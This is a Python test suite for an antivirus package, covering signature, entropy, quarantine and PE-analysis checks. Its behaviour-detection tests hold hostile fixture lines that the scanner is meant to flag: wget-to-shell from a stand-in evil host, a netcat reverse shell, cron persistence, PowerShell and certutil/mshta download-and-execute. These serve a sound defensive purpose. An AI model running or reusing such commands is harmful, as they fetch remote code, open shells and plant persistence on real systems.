"""Tests for the AntiVirus package.

Run with either:
    python3 -m unittest discover -s tests -v
    python3 -m pytest -v        # if pytest is installed
"""
from __future__ import annotations

import contextlib
import io
import json
import os
import shutil
import tempfile
import time
import unittest
from pathlib import Path

from antivirus.config import Config
from antivirus.models import Finding
from antivirus.quarantine import Quarantine
from antivirus.report import ReportWriter, render_report
from antivirus.scanner import ScanResult, Scanner, shannon_entropy
from antivirus.signatures import Signature, SignatureDB

ROOT = Path(__file__).resolve().parent.parent
BUNDLED_DB = ROOT / "data" / "signatures.json"

# The standard, harmless EICAR antivirus test string (not malware).
EICAR = b"X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"


class App:
    """Fixture that wires config/db/scanner/quarantine into a temp dir."""

    def __init__(self, base: Path):
        self.config = Config()
        self.config.quarantine_dir = base / "quarantine"
        self.config.report_dir = base / "reports"
        self.config.signatures_file = base / "signatures.json"
        if BUNDLED_DB.exists():
            shutil.copyfile(BUNDLED_DB, self.config.signatures_file)
        self.db = SignatureDB(self.config.signatures_file)
        self.scanner = Scanner(self.config, self.db)
        self.quarantine = Quarantine(self.config.quarantine_dir)


class ScannerTests(unittest.TestCase):
    def setUp(self):
        path = Path(tempfile.mkdtemp(prefix="av-test-"))
        self.addCleanup(lambda: shutil.rmtree(path, ignore_errors=True))
        self.app = App(path)

    def test_detects_eicar_by_hash(self):
        f = self.app.config.quarantine_dir.parent / "eicar.txt"
        f.write_bytes(EICAR)
        findings = self.app.scanner.scan_file(f)
        self.assertTrue(any(x.kind == "signature-hash" for x in findings))
        self.assertEqual(findings[0].severity, "critical")

    def test_detects_eicar_pattern_when_hash_differs(self):
        f = self.app.config.quarantine_dir.parent / "wrapped.bin"
        f.write_bytes(b"\x00\x01" * 50 + EICAR + b"\xff" * 50)
        findings = self.app.scanner.scan_file(f)
        self.assertTrue(any(x.kind == "signature-pattern" for x in findings))

    def test_clean_file_is_not_flagged(self):
        f = self.app.config.quarantine_dir.parent / "clean.txt"
        f.write_text("hello world\n" * 10)
        self.assertEqual(self.app.scanner.scan_file(f), [])

    def test_directory_walk(self):
        base = self.app.config.quarantine_dir.parent
        (base / "a.txt").write_text("fine")
        (base / "sub").mkdir()
        (base / "sub" / "b.txt").write_text("also fine")
        (base / "sub" / "eicar.txt").write_bytes(EICAR)
        result = self.app.scanner.scan_path(base)
        self.assertGreaterEqual(result.files_scanned, 3)
        self.assertEqual(len(result.findings), 1)
        self.assertTrue(result.findings[0].path.endswith("eicar.txt"))
        self.assertFalse(result.clean)

    def test_quarantine_dir_is_not_scanned(self):
        base = self.app.config.quarantine_dir.parent
        qfile = self.app.config.quarantine_dir / "files" / "hidden.bin"
        qfile.parent.mkdir(parents=True, exist_ok=True)
        qfile.write_bytes(EICAR)  # would be a threat if we scanned the quarantine
        result = self.app.scanner.scan_path(base)
        self.assertEqual(result.findings, [])

    def test_high_entropy_heuristic(self):
        import random

        f = self.app.config.quarantine_dir.parent / "packed.bin"
        f.write_bytes(random.Random(7).randbytes(300 * 1024))
        findings = self.app.scanner.scan_file(f)
        self.assertTrue(any(x.kind == "heuristic" for x in findings))

    def test_skips_files_over_max_size(self):
        f = self.app.config.quarantine_dir.parent / "big.bin"
        with open(f, "wb") as fh:
            fh.truncate(self.app.config.max_file_size + 1)
        result = self.app.scanner.scan_path(f)
        self.assertEqual(result.files_scanned, 0)
        self.assertEqual(result.files_skipped, 1)
        self.assertTrue(result.errors)


class EfficiencyTests(unittest.TestCase):
    def setUp(self):
        import tempfile

        path = Path(tempfile.mkdtemp(prefix="av-eff-"))
        self.addCleanup(lambda: shutil.rmtree(path, ignore_errors=True))
        self.app = App(path)

    def _populate(self, base: Path) -> None:
        for i in range(30):
            (base / f"file-{i:03d}.txt").write_text(f"content {i}\n" * 20)
        (base / "infected.bin").write_bytes(b"\x00" * 32 + EICAR + b"\x00" * 32)

    def test_parallel_matches_serial(self):
        base = self.app.config.quarantine_dir.parent
        self._populate(base)
        serial = self.app.scanner.scan_path(base)  # threads default -> auto
        self.app.scanner.threads = 1
        one = self.app.scanner.scan_path(base)
        self.app.scanner.threads = 8
        parallel = self.app.scanner.scan_path(base)
        for res in (serial, one, parallel):
            # 30 ordinary + infected.bin + signatures.json copied in by App()
            self.assertEqual(res.files_scanned, 32)
            # infected.bin is EICAR with padding -> hash differs, pattern hits
            self.assertEqual(
                sorted((f.path, f.kind) for f in res.findings),
                [(str(base / "infected.bin"), "signature-pattern")],
            )
            self.assertEqual(res.bytes_scanned, serial.bytes_scanned)

    def test_heuristic_not_suppressed_after_earlier_finding(self):
        # Regression: the heuristic layer used to be gated on the
        # tree-wide findings list, so any earlier threat silently
        # disabled heuristics for every later file in a directory scan.
        import random

        base = self.app.config.quarantine_dir.parent
        (base / "a-infected.txt").write_bytes(EICAR)           # sorts first
        (base / "z-packed.bin").write_bytes(                   # sorts last
            random.Random(1).randbytes(300 * 1024))
        self.app.scanner.threads = 1  # sequential – the bug's scenario
        result = self.app.scanner.scan_path(base)
        kinds = {(f.path.rsplit("/", 1)[-1], f.kind) for f in result.findings}
        self.assertIn(("a-infected.txt", "signature-hash"), kinds)
        self.assertIn(("z-packed.bin", "heuristic"), kinds)

    def test_workers_parsing(self):
        scanner = self.app.scanner
        self.assertEqual(scanner._workers(), scanner._workers())  # stable
        scanner.threads = 1
        self.assertEqual(scanner._workers(), 1)
        scanner.threads = 0
        self.assertEqual(scanner._workers(), 1)
        scanner.threads = "4"
        self.assertEqual(scanner._workers(), 4)
        scanner.threads = "bogus"
        self.assertEqual(scanner._workers(), 1)

    def test_combined_regex_matches_multiple_patterns(self):
        db = self.app.db
        db.add(Signature(id="P1", name="P1", category="test", severity="low",
                         pattern=b"MARKER-ALPHA-111".decode()))
        db.add(Signature(id="P2", name="P2", category="test", severity="low",
                         pattern=b"MARKER-BETA-222".decode()))
        f = self.app.config.quarantine_dir.parent / "both.txt"
        f.write_text("x MARKER-ALPHA-111 y MARKER-BETA-222 z\n")
        findings = self.app.scanner.scan_file(f)
        self.assertEqual(sorted(x.name for x in findings), ["P1", "P2"])

    def test_combined_regex_fallback_on_bad_combined(self):
        # Two patterns that cannot be merged (clashing internal group names)
        # must fall back to per-pattern matching without errors.
        db = self.app.db
        db.add(Signature(id="C1", name="C1", category="test", severity="low",
                         pattern=r"(?P<x>a)"))
        db.add(Signature(id="C2", name="C2", category="test", severity="low",
                         pattern=r"(?P<x>b)"))
        self.app.scanner._sync_patterns()
        f = self.app.config.quarantine_dir.parent / "c.txt"
        f.write_text("a b\n")
        findings = self.app.scanner.scan_file(f)
        self.assertEqual(sorted(x.name for x in findings), ["C1", "C2"])


class QuarantineTests(unittest.TestCase):
    def setUp(self):
        import tempfile

        path = Path(tempfile.mkdtemp(prefix="av-q-"))
        self.addCleanup(lambda: shutil.rmtree(path, ignore_errors=True))
        self.app = App(path)

    def _finding(self, path: Path) -> "Scanner":
        return self.app.scanner.scan_file(path)[0]

    def test_put_and_restore(self):
        f = self.app.config.quarantine_dir.parent / "victim.txt"
        f.write_bytes(EICAR)
        finding = self.app.scanner.scan_file(f)[0]
        item = self.app.quarantine.put(f, finding)
        self.assertFalse(f.exists())
        self.assertTrue(any(i.id == item.id for i in self.app.quarantine.items()))

        restored, target = self.app.quarantine.restore(item.id[:12])  # prefix match
        self.assertEqual(restored.id, item.id)
        self.assertEqual(target.read_bytes(), EICAR)
        self.assertEqual(self.app.quarantine.items(), [])

    def test_restore_to_cwd_when_parent_gone(self):
        f = self.app.config.quarantine_dir.parent / "sub" / "victim.txt"
        f.parent.mkdir(parents=True)
        f.write_bytes(EICAR)
        item = self.app.quarantine.put(f, self.app.scanner.scan_file(f)[0])
        shutil.rmtree(f.parent)
        cwd = os.getcwd()
        os.chdir(self.app.config.quarantine_dir.parent)
        try:
            _, target = self.app.quarantine.restore(item.id)
            self.assertEqual(target.parent, self.app.config.quarantine_dir.parent)
            self.assertTrue(target.exists())
        finally:
            os.chdir(cwd)

    def test_purge(self):
        f = self.app.config.quarantine_dir.parent / "victim.txt"
        f.write_bytes(EICAR)
        item = self.app.quarantine.put(f, self.app.scanner.scan_file(f)[0])
        self.app.quarantine.purge(item.id)
        self.assertEqual(self.app.quarantine.items(), [])
        self.assertFalse((self.app.quarantine.files_dir / f"{item.id}.quarantined").exists())

    def test_unknown_id_raises(self):
        with self.assertRaises(KeyError):
            self.app.quarantine.restore("nope")


class SignatureDBTests(unittest.TestCase):
    def setUp(self):
        import tempfile

        path = Path(tempfile.mkdtemp(prefix="av-db-"))
        self.addCleanup(lambda: shutil.rmtree(path, ignore_errors=True))
        self.dbfile = path / "signatures.json"

    def test_add_and_reload(self):
        db = SignatureDB(self.dbfile)
        db.add(Signature(id="T1", name="T1", category="test", severity="low",
                         pattern="MY-TEST-STRING-XYZ"))
        self.assertTrue(self.dbfile.exists())

        db2 = SignatureDB(self.dbfile)
        self.assertEqual([s.id for s in db2.list()], ["T1"])

        scanner = Scanner(Config(), db2)
        base = self.dbfile.parent
        f = base / "x.txt"
        f.write_text("hello MY-TEST-STRING-XYZ world")
        findings = scanner.scan_file(f)
        self.assertTrue(any(x.name == "T1" for x in findings))

    def test_invalid_pattern_rejected(self):
        db = SignatureDB(self.dbfile)
        with self.assertRaises(ValueError):
            db.add(Signature(id="T2", name="T2", category="test",
                             severity="low", pattern="([unclosed"))

    def test_signature_without_any_matcher_rejected(self):
        db = SignatureDB(self.dbfile)
        with self.assertRaises(ValueError):
            db.add(Signature(id="T3", name="T3", category="test", severity="low"))


class BehaviorTests(unittest.TestCase):
    def setUp(self):
        path = Path(tempfile.mkdtemp(prefix="av-beh-"))
        self.addCleanup(lambda: shutil.rmtree(path, ignore_errors=True))
        self.base = path
        self.db = SignatureDB(path / "sig.json")  # empty db is fine
        self.scanner = Scanner(Config(), self.db, threads=1)

    def _scan(self, name: str, content, mode: str = "text") -> list:
        p = self.base / name
        if mode == "text":
            p.write_text(content)
        else:
            p.write_bytes(content)
        return self.scanner.scan_file(p)

    def _behavior(self, findings) -> list:
        return [f for f in findings if f.kind == "behavior"]

    def test_python_indicators(self):
        src = (
            "import base64, os, socket, subprocess\n"
            "os.system('id')\n"
            "subprocess.run('whoami', shell=True)\n"
            "s = socket.socket()\n"
            "s.connect(('10.0.0.9', 4444))\n"
            "exec(base64.b64decode('aGVsbG8='))\n"
        )
        names = {f.name for f in self._behavior(self._scan("x.py", src))}
        self.assertIn("Shell command execution", names)
        self.assertIn("Subprocess with shell=True", names)
        self.assertIn("Hardcoded network target", names)
        self.assertIn("Dynamic code execution (exec)", names)
        self.assertIn("Encoded payload handling", names)

    def test_python_constant_eval_not_flagged(self):
        src = "print(eval('1 + 1'))\n"
        names = {f.name for f in self._behavior(self._scan("c.py", src))}
        self.assertNotIn("Dynamic code execution (eval)", names)

    def test_python_unparseable_falls_back_to_regex(self):
        src = "def broken(:\n  exec(base64.b64decode(x))\n"
        findings = self._behavior(self._scan("broken.py", src))
        self.assertTrue(any("Dynamic code execution" in f.name for f in findings))

    def test_shell_indicators(self):
        sh = (
            "#!/bin/sh\n"
            "wget -qO- http://evil.example/x.sh | sh\n"
            "nc -e /bin/sh 10.0.0.9 4444\n"
            "echo '* * * * * /tmp/x' >> /etc/cron.d/miner\n"
            "echo x | base64 -d | bash\n"
        )
        names = {f.name for f in self._behavior(self._scan("s.sh", sh))}
        self.assertIn("Downloads a remote script and pipes it into a shell", names)
        self.assertIn("netcat with exec flag (reverse shell)", names)
        self.assertIn("Persistence mechanism (cron / service / shell rc / startup)", names)
        self.assertIn("Decodes embedded base64 and pipes it into a shell", names)

    def test_powershell_indicators(self):
        ps = (
            "IEX (New-Object Net.WebClient).DownloadString('http://x.example/a')\n"
            "$a = \"-ExecutionPolicy Bypass\"\n"
            "$t = New-Object System.Net.Sockets.TcpClient('10.0.0.9', 4444)\n"
        )
        names = {f.name for f in self._behavior(self._scan("a.ps1", ps))}
        self.assertIn("Download & execute", names)
        self.assertIn("Execution policy bypass", names)
        self.assertIn("Raw socket usage", names)

    def test_batch_indicators(self):
        bat = (
            "@echo off\n"
            "certutil -urlcache -f -split http://x.example/d.exe %%TEMP%%\\d.exe\n"
            "mshta http://x.example/x.hta\n"
        )
        names = {f.name for f in self._behavior(self._scan("d.bat", bat))}
        self.assertIn("certutil URL download (LOLBin)", names)
        self.assertIn("mshta remote/HTA script execution (LOLBin)", names)

    def test_pe_dangerous_imports(self):
        from antivirus.samples import SUSPICIOUS_PE_DLLS, build_sample_pe

        findings = self._behavior(self._scan("a.exe", build_sample_pe(SUSPICIOUS_PE_DLLS), mode="bytes"))
        names = {f.name for f in findings}
        self.assertIn("PE imports: Process-injection API set (remote alloc + write + thread)", names)
        self.assertIn("PE downloads AND executes code", names)
        sevs = {f.name: f.severity for f in findings}
        self.assertEqual(sevs["PE downloads AND executes code"], "high")

    def test_pe_benign_imports_clean(self):
        from antivirus.samples import BENIGN_PE_DLLS, build_sample_pe

        pe = build_sample_pe(BENIGN_PE_DLLS, reloc_rva=0x1010, debug_dir=True)
        self.assertEqual(self._behavior(self._scan("b.exe", pe, mode="bytes")), [])

    def test_non_executable_document_not_analysed(self):
        # Same dangerous text, but in a .txt document -> not executable-looking.
        findings = self._scan("notes.txt", "curl http://x.example/x.sh | sh\n")
        self.assertEqual(self._behavior(findings), [])
        self.assertEqual(findings, [])

    def test_suid_executable_flagged(self):
        p = self.base / "suid.sh"
        p.write_text("#!/bin/sh\necho hi\n")
        os.chmod(p, 0o4755)
        names = {f.name for f in self._behavior(self.scanner.scan_file(p))}
        self.assertIn("setuid executable", names)

    def test_behavior_can_be_disabled(self):
        sh = self.base / "s.sh"
        sh.write_text("curl http://x.example/x.sh | sh\n")
        self.assertTrue(self._behavior(self.scanner.scan_file(sh)))
        self.scanner.config.behavior_enabled = False
        self.assertEqual(self._behavior(self.scanner.scan_file(sh)), [])

    def test_large_file_skips_behavior_but_still_hashes(self):
        big = self.base / "big.sh"
        with open(big, "wb") as fh:
            fh.write(b"#!/bin/sh\n" + b"a" * (self.scanner.config.behavior_max_size + 1))
        findings = self.scanner.scan_file(big)
        # behaviour skipped (file > behaviour_max_size), hash layer still ran
        self.assertEqual(findings, [])
        self.assertGreater(big.stat().st_size, self.scanner.config.behavior_max_size)


class PeDebugTests(unittest.TestCase):
    """v1.3: static PE dissection (the 'debug report') + debug-derived indicators."""

    def test_parse_fields_suspicious(self):
        from antivirus.pe import parse_pe
        from antivirus.samples import build_suspicious_pe

        info = parse_pe(build_suspicious_pe())
        self.assertTrue(info.valid)
        self.assertFalse(info.is_64)
        self.assertEqual(info.machine_name, "i386")
        self.assertEqual(info.entry_point_rva, 0)
        self.assertEqual(info.exports, ["run_payload"])
        self.assertEqual(len(info.imports), 4)
        self.assertIn("URLDownloadToFileA", info.imports.get("wininet.dll", []))
        self.assertEqual(info.reloc_entries, 0)
        self.assertEqual(info.debug_dirs, 0)
        self.assertEqual(len(info.resources), 1)
        self.assertIn("VBScript (WScript.Shell)", info.resources[0].markers)

    def test_debug_indicators_suspicious(self):
        from antivirus.pe import parse_pe, pe_indicators
        from antivirus.samples import build_suspicious_pe

        names = {i.name for i in pe_indicators(parse_pe(build_suspicious_pe()))}
        for expected in (
            "ASLR disabled",
            "DEP (NX) disabled",
            "No entry point",
            "No base relocations",
            "No debug information",
            "PE imports: Process-injection API set (remote alloc + write + thread)",
            "PE downloads AND executes code",
        ):
            self.assertIn(expected, names)
        self.assertTrue(any("Embedded in resources: VBScript" in n for n in names))

    def test_packed_indicators(self):
        from antivirus.pe import parse_pe, pe_indicators
        from antivirus.samples import build_packed_pe

        names = {i.name for i in pe_indicators(parse_pe(build_packed_pe()))}
        for expected in ("RELOCS_STRIPPED", "Known packer section name",
                         "Packed/encrypted PE section", "No import table"):
            self.assertIn(expected, names)

    def test_clean_pe_zero_findings(self):
        from antivirus.pe import parse_pe, pe_indicators
        from antivirus.samples import build_clean_pe

        info = parse_pe(build_clean_pe())
        self.assertTrue(info.valid)
        self.assertEqual(pe_indicators(info), [])

    def test_pe32plus_imports(self):
        from antivirus.pe import parse_pe
        from antivirus.samples import SUSPICIOUS_PE_DLLS, _MACHINE_64, build_sample_pe

        info = parse_pe(build_sample_pe(SUSPICIOUS_PE_DLLS, machine=_MACHINE_64))
        self.assertTrue(info.valid)
        self.assertTrue(info.is_64)
        self.assertEqual(len(info.api_set), 7)

    def test_malformed_pe_never_crashes(self):
        from antivirus.pe import parse_pe, pe_indicators

        for blob in (b"", b"MZ", b"MZ" + b"\0" * 40, b"not a PE file at all" * 10):
            info = parse_pe(blob)
            self.assertFalse(info.valid)
            self.assertEqual(pe_indicators(info), [])

    def test_cli_pe_analyze_json(self):
        import contextlib
        import json as _json
        from io import StringIO

        from antivirus import cli
        from antivirus.samples import build_suspicious_pe

        base = Path(tempfile.mkdtemp(prefix="av-pe-"))
        self.addCleanup(lambda: shutil.rmtree(base, ignore_errors=True))
        p = base / "s.exe"
        p.write_bytes(build_suspicious_pe())
        buf = StringIO()
        with contextlib.redirect_stdout(buf):
            rc = cli.main(["pe", "analyze", str(p), "--json"])
        self.assertEqual(rc, 1)  # findings present -> non-zero exit
        payload = _json.loads(buf.getvalue())
        self.assertTrue(payload["valid"])
        self.assertIn("run_payload", payload["exports"])
        self.assertTrue(payload["indicators"])


class GuiTests(unittest.TestCase):
    """The GUI module must stay importable and honest without a display."""

    def test_module_importable_and_helpers(self):
        import antivirus.gui as g

        self.assertTrue(hasattr(g, "run_gui"))
        self.assertIsInstance(g.tk_available(), bool)
        f = Finding(path="/tmp/x.exe", kind="behavior", name="T",
                    severity="high", message="m", size=42)
        self.assertEqual(g.finding_row(f),
                         ("high", "T", "/tmp/x.exe", "behavior", "m"))
        for sev in ("critical", "high", "medium", "low", "info"):
            fg, bg = g.SEVERITY_COLORS[sev]
            self.assertTrue(fg.startswith("#") and bg.startswith("#"))

    def test_summarize(self):
        import antivirus.gui as g

        r = ScanResult(target="/x", started_at=time.time())
        r.finished_at = time.time()
        self.assertIn("CLEAN", g.summarize(r, {}))
        r.findings.append(Finding(path="/x", kind="behavior", name="T",
                                  severity="high", message="m"))
        s = g.summarize(r, {"/x": "deleted"})
        self.assertIn("INFECTED", s)
        self.assertIn("action(s) taken", s)

    def test_gui_command_degrades_gracefully_headless(self):
        import antivirus.gui as g

        if g.tk_available():
            self.skipTest("tkinter present – the GUI would actually open")
        from antivirus import cli

        buf = io.StringIO()
        with contextlib.redirect_stderr(buf):
            rc = cli.main(["gui"])
        self.assertEqual(rc, 2)
        self.assertIn("Tkinter", buf.getvalue())


class MiscTests(unittest.TestCase):
    def test_shannon_entropy(self):
        self.assertEqual(shannon_entropy(b""), 0.0)
        self.assertEqual(shannon_entropy(b"aaaa"), 0.0)
        self.assertAlmostEqual(shannon_entropy(bytes(range(256)) * 10), 8.0)

    def test_scan_result_json_roundtrip(self):
        import time

        base = Path(tempfile.mkdtemp(prefix="av-rep-"))
        self.addCleanup(lambda: shutil.rmtree(base, ignore_errors=True))
        result = ScanResult(target=str(base), started_at=time.time())
        result.finished_at = time.time()
        writer = ReportWriter(base / "reports")
        path = writer.save(result, action="detect")
        self.assertTrue(path.exists())
        self.assertTrue(path.with_suffix(".txt").exists())
        self.assertEqual(writer.latest(), path)
        text = render_report(json.loads(path.read_text()))
        self.assertIn("CLEAN", text)


if __name__ == "__main__":
    unittest.main()
